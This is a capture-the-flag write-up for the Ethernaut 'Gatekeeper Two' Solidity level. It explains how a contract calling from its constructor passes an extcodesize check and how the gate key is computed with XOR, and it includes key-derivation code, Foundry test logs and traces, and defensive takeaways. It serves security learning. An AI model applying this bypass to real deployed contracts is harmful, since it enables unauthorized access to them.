# 14 - Gatekeeper Two

## 1. Challenge Overview

- **Objective**: Call `enter(bytes8 _gateKey)` and pass all three modifiers (`gateOne`, `gateTwo`, `gateThree`) so `entrant` becomes `tx.origin`.
- **Vulnerability Category**: Constructor `extcodesize` Bypass, Type Casting & Bitwise XOR Self-Inverse.

---

## 2. Contract Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

---

## 3. Study Notes & Gate Breakdown

### Gate 1 + Gate 2: The Constructor `extcodesize == 0` Paradox

```solidity
modifier gateOne() { require(msg.sender != tx.origin); _; }
modifier gateTwo() {
    uint256 x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
}
```

- **Gate 1** (`msg.sender != tx.origin`) forces the caller to be a smart contract.
- **Gate 2** checks `extcodesize(caller()) == 0` in inline assembly, attempting to reject smart contracts by checking whether `msg.sender` has deployed bytecode.
- **Why this fails during contract creation**:
  EVM contract deployment happens in two distinct phases:
  1. **Creation phase (`constructor` execution)**: Initcode runs and can make outbound calls using `address(this)`, while the account's runtime bytecode has **not yet been stored** at that address—so `extcodesize(address(this)) == 0`.
  2. **Post-creation**: Once the constructor finishes and returns the runtime bytecode (`136 bytes` in our Foundry trace), `extcodesize` becomes non-zero.
- Placing `enter(gateKey)` directly inside `GatekeeperTwoAttack`'s **`constructor`** satisfies both `msg.sender != tx.origin` (it is a contract address) and `extcodesize(caller()) == 0` at the exact moment `GatekeeperTwo` runs.

---

### Gate 3: Type Casting & Bitwise XOR (`^`)

```solidity
require(
    uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
);
```

#### 1. Type Casting Chain on `keccak256(...)`

- `keccak256(abi.encodePacked(msg.sender))` returns a **`bytes32`** (256 bits).
- Solidity `0.8+` cannot cast `bytes32` directly to `uint64` because converting across `bytes` and `uint` also requires matching bit widths:
  1. `bytes32` $\rightarrow$ **`bytes8(...)`**: Narrowing fixed bytes keeps the **leftmost 8 bytes** (first 16 hex chars of the hash).
  2. `bytes8` $\rightarrow$ **`uint64(...)`**: Same 64-bit width cross-type conversion from `bytes8` to `uint64`.
- Inside `GatekeeperTwoAttack`'s constructor, `msg.sender` seen by `GatekeeperTwo` will be **`address(this)`** (our attacker contract's address), not `tx.origin`.

#### 2. Solving the XOR Equation

Let $A = \text{uint64}(\text{bytes8}(\text{keccak256}(\text{abi.encodePacked}(\text{address(this)}))))$, $B = \text{uint64}(\_gateKey)$, and $\text{MAX} = \text{type(uint64).max} = \text{0xFFFFFFFFFFFFFFFF}$.

Since bitwise XOR (`^`) is self-inverse ($A \oplus A = 0$, and $0 \oplus X = X$):

$$A \oplus B = \text{MAX} \iff B = A \oplus \text{MAX}$$

Verification: $A \oplus (A \oplus \text{MAX}) = (A \oplus A) \oplus \text{MAX} = 0 \oplus \text{MAX} = \text{MAX}$.

```solidity
uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
uint64 b = a ^ type(uint64).max;
bytes8 gateKey = bytes8(b);
```

_(Note: `a ^ type(uint64).max` is equivalent to bitwise NOT `~a` on a `uint64`.)_

---

## 4. Exploit Execution & Verification

### Attacker Contract (`src/attackers/GatekeeperTwoAttack.sol`)

Because the entire attack runs inside the `constructor`, deploying `GatekeeperTwoAttack` executes the exploit in a single `CREATE` transaction—no follow-up `attack()` call needed.

### Local Foundry Test (`test/14-GatekeeperTwo.t.sol`)

```bash
forge test --match-contract GatekeeperTwoTest -vvvv
```

```text
Ran 2 tests for test/14-GatekeeperTwo.t.sol:GatekeeperTwoTest
[PASS] test_ConstructorExploitPassesAllThreeGates() (gas: 123666)
Logs:
  Local PoC Success: Attack executed during constructor!
  Gate key used:
  0xe77b313c3f158efe
  Attacker runtime extcodesize post-deploy: 136
  Entrant is now: 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
[PASS] test_InitialEntrantIsZero() (gas: 7818)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.46ms (583.13µs CPU time)
```

Key trace observation confirming the `extcodesize == 0` window:

```text
    ├─ [75548] → new GatekeeperTwoAttack@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   ├─ [22790] GatekeeperTwo::enter(0xe77b313c3f158efe)
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 136 bytes of code
```

`GatekeeperTwo::enter` completed _before_ `new GatekeeperTwoAttack` returned its `136 bytes of code` to storage.

### Live Execution (`script/14-GatekeeperTwo.s.sol`)

```bash
make sim LEVEL=14
make exploit LEVEL=14
```

---

## 5. Key Security Takeaways

1. **Never use `extcodesize(addr) == 0` to verify an EOA**:
   - Contracts calling from inside their `constructor` have `extcodesize == 0`.
   - Pre-computed `CREATE2` addresses and self-destructed / EIP-7702 / non-deployed addresses also complicate code-size assumptions.
2. **Checking `msg.sender == tx.origin` is the only strict EOA check**, though even that breaks smart contract wallets (Account Abstraction / Safe multisigs) and is generally discouraged unless strictly necessary (use reentrancy guards / commit-reveal / flash-loan-safe accounting instead of blocking contracts).
